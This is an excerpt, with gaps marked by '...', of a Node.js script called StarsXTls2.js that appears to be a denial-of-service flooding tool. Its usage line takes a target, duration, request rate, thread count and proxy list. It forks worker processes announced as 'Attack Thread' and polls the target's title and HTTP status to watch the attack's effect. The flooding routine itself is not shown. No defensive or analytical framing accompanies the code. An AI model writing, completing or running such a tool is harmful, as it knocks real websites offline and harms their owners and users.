...
if (process.argv.length < 7) {
  console.log(``);
  console.log(`node StarsXTls2.js [TARGET] [TIME] [RATE] [THREAD] [PROXY]`);
  process.exit();
}
const headers = {};
...
function getStatus() {
  ...
  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      ...
      console.log(
        `[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(
          data
    ...
    .catch((error) => {
      if (error.message === "Request timed out") {
        console.log(
          `[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Request Timed Out`
        );
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(
          `[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${
            error.response.status
          }\x1b[0m)`
        );
      } else {
        console.log(
          `[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} ${error.message}`
        );
      }
    });
}
...
if (cluster.isMaster) {
  ...
  for (let i = 1; i <= process.argv[5]; i++) {
    cluster.fork();
    console.log(
      `[\x1b[35mINFO\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`
    );
  }
  console.log(
    `[\x1b[35mSYSTEM\x1b[0m] ${getCurrentTime()} The Attack Has Started`
  );
